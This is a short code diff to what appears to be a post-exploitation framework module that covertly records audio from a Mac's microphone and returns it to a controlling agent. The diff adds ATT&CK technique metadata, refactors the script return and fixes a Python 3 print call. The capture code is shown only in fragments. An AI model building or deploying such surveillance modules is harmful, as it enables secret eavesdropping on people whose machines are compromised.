@@ -15,6 +15,10 @@ class Module(object):
             'Description': ('Records audio through the MacOS webcam mic '
                             'by leveraging the Apple AVFoundation API.'),
 
+            'Software': '',
+
+            'Techniques': ['T1512'],
+
             # True if the module needs to run in the background
             'Background': False,
 
@@ -90,7 +94,7 @@ class Module(object):
         record_time = self.options['RecordTime']['Value']
         output_dir = self.options['OutputDir']['Value']
 
-        return '''
+        script = '''
 import objc
 import objc._objc
 import time
@@ -153,8 +157,11 @@ if __name__ == '__main__':
     run_command('rm -f ' + output_path)
 
     # return captured audio to agent
-    print captured_audio
+    print(captured_audio)
 
     del pool
     
 ''' % (record_time, output_dir) # script
+
+        return script
+
